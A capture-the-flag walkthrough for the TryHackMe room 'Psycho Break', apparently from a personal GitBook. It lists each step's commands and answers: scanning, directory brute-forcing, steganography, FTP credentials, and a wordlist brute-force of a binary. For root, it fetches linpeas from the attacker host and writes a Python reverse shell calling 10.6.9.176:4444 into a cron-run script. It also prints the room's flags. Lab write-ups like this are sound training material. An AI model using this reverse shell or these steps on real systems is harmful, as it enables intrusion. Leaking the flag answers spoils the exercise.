# Psycho Break

{% embed url="https://tryhackme.com/room/psychobreak" %}
https://tryhackme.com/room/psychobreak
{% endembed %}

![](<../../.gitbook/assets/Psycho Break.png>)

## Task 1 Recon

#### How many ports are open?

```bash
rustscan -a 10.10.233.93 -- -n -sVC
```

![](<../../.gitbook/assets/Screenshot from 2022-04-01 05-58-06.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 05-58-28.png>)

{% hint style="success" %}
`3`
{% endhint %}

#### What is the operating system that runs on the target machine?

{% hint style="success" %}
`Ubuntu`
{% endhint %}

## Task 2 Web

#### Key to the looker room

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-02-25.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-03-24.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-04-23.png>)

{% hint style="success" %}
`532219a04ab7a02b56faafbec1a4c1ea`
{% endhint %}

#### Key to access the map

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-05-05.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-20-32.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-20-13.png>)

{% hint style="success" %}
`Grant_me_access_to_the_map_please`
{% endhint %}

#### The Keeper Key

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-23-06.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-24-06.png>)

```bash
gobuster dir -u http://10.10.233.93/SafeHeaven \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
             -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-09-02.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-58-06.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-59-28.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 06-59-13.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-00-47.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-00-34.png>)

{% hint style="success" %}
`48ee41458eb0b43bf82b986cecf3af01`
{% endhint %}

#### What is the filename of the text file

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-07-04.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-07-53.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-08-09.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-12-38.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-18-57.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-19-12.png>)

{% hint style="success" %}
`you_made_it`
{% endhint %}

## Task 3 Help Mee

#### Who is locked up in the cell?

```bash
wget http://10.10.233.93/abandonedRoom/680e89809965ec41e64dc7e447f175ab/helpme.zip
unzip helpme.zip
cat helpme.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-30-51.png>)

{% hint style="success" %}
`Joseph`
{% endhint %}

#### There is something weird with the .wav file. What does it say?

```bash
binwalk -e Table.jpg
```

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-31-08.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-01 07-33-59.png>)

{% hint style="success" %}
`SHOWME`
{% endhint %}

#### What is the FTP Username

```bash
cd _Table.jpg.extracted
steghide extract -sf Joseph_Oda.jpg -p SHOWME
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 05-32-42.png>)

{% hint style="success" %}
`joseph`
{% endhint %}

#### What is the FTP User Password

{% hint style="success" %}
`intotheterror445`
{% endhint %}

## Task 4 Crack it open

```bash
lftp -u joseph,intotheterror445 10.10.40.209
ftp > ls -A
ftp > get program random.dic
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 05-40-06.png>)

#### The key used by the program

```bash
chmod +x prpgram
for word in $(cat random.dic); do ./program ${word//[$'\t\r\n ']/} | grep -v Incorrect; done
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 05-53-30.png>)

{% hint style="success" %}
`kidman`
{% endhint %}

#### What do the crazy long numbers mean when there decrypted.

![](<../../.gitbook/assets/Screenshot from 2022-04-02 06-00-44.png>)

{% hint style="success" %}
`KIDMANSPASSWORDISSOSTRANGE`
{% endhint %}

## Task 5 Go Capture The Flag

#### user.txt

```bash
ssh kidman@10.10.40.209
ls -A
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 06-08-52.png>)

{% hint style="success" %}
`4C72A4EF8E6FED69C72B4D58431C4254`
{% endhint %}

#### root.txt

```bash
cat .readThis.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 06-10-44.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-02 06-10-27.png>)

```bash
wget http://10.6.9.176/linpeas.sh
bash linpeas.sh
ls -lA /var/.the_eye_of_ruvik.py
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.9.176",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' > /var/.the_eye_of_ruvik.py 
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 06-15-25.png>)

```bash
nc -nvlp 4444
find / -type f -name root.txt 2>/dev/null
cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 06-18-13.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-02 06-23-35.png>)

{% hint style="success" %}
`BA33BDF5B8A3BFC431322F7D13F3361E`
{% endhint %}

#### Defeat Ruvik

```bash
deluser --remove-all-files ruvik
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 06-27-56.png>)
